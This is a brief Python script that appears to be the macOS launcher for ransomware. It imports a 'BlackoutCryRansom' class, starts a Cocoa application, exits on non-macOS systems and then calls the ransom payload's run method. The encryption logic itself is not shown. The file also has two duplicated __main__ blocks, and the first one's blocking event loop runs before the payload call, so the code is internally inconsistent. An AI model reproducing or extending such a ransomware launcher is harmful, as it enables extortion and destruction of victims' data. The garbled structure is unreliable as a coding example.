from blackout_cry_ransom import BlackoutCryRansom
from utils import get_os
import platform, objc
from Cocoa import NSApplication, NSObject
from Foundation import NSObject

class AppDelegate(NSObject):
    def applicationSupportsSecureRestorableState_(self, application):
        return True  

    def applicationDidFinishLaunching_(self, notification):
        print("Application launched")

if __name__ == "__main__":
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    app.setDelegate_(delegate)
    app.run()


if __name__ == "__main__":
    operating_system = get_os()
    if operating_system != "macOS":
        exit(0)

    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    app.setDelegate_(delegate)
    app.run()

    randsom = BlackoutCryRansom()
    randsom.run()